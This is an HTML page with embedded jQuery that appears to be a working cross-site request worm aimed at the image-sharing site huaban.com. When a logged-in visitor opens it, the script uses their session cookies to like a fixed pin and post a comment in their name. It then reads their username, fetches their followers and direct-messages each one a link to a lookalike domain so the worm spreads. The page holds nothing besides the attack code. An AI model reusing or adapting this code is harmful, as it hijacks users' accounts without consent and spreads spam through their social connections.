<html>
<head>
    <meta http-equiv="X-UA-Compatible" content="IE=edge;" />
    <title>HI HUABAN IAMANEWBOTNAMEDCORSBOT</title>
    <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
</head>
<body>
<script>
$(document).ready(function(){
    var myfood = '940838068';
    hb = {};
    hb.dmsend = function(user_id, msg){
        $.ajax({url: 'http://huaban.com/dm/send/',
            type: 'POST',
            xhrFields: {withCredentials: true},
            data: 'to_user_id=' + user_id + '&text=' + msg,
            success: function(c){$('#t').text(c);}
        });
    };

    hb.like = function(cb){
        $.ajax({url: 'http://huaban.com/pins/' + myfood + '/like/',
            type: 'POST',
            xhrFields: {withCredentials: true},
            dataType: 'json',
            beforeSend: function(request) {
                request.setRequestHeader("X-Requested-With", "XMLHttpRequest");
                request.setRequestHeader("X-Request", "JSON");
            },
            success: cb
        });
    };

    hb.comment = function(cb){
        $.ajax({url: 'http://huaban.com/pins/' + myfood + '/comments/',
            type: 'POST',
            xhrFields: {withCredentials: true},
            dataType: 'json',
            beforeSend: function(request) {
                request.setRequestHeader("X-Requested-With", "XMLHttpRequest");
                request.setRequestHeader("X-Request", "JSON");
            },
            data: 'text=CORSBOTLIKEIT' + Math.random().toString(),
            success: cb
        });
    };

    hb.followuserids = function(urlname, cb){
        $.ajax({url: 'http://huaban.com/' + urlname + '/followers/?limit=50',
            type: 'GET',
            xhrFields: {withCredentials: true},
            dataType: 'json',
            beforeSend: function(request) {
                request.setRequestHeader("X-Requested-With", "XMLHttpRequest");
                request.setRequestHeader("X-Request", "JSON");
            },
            success: cb
        });
    };

    hb.like(cb = function(c){
        hb.comment(cb = function(c){
            var urlname = c.comment.user.urlname;
            $('#t').text(urlname);
            hb.followuserids(urlname, cb = function(c){
                var ids = Array();
                for(i in c.users){
                    var user_id = c.users[i].user_id;
                    ids.push(user_id);
                    hb.dmsend(user_id, 'YESIAMANEWBOTNAMEDCORSBOT' + Math.random().toString() + 'UCANEXPLOREMEAT: HTTP://HUABAN.COM.AL3RT.IO/');
                }
            });
        });
    });
});
</script>
</body>
</html>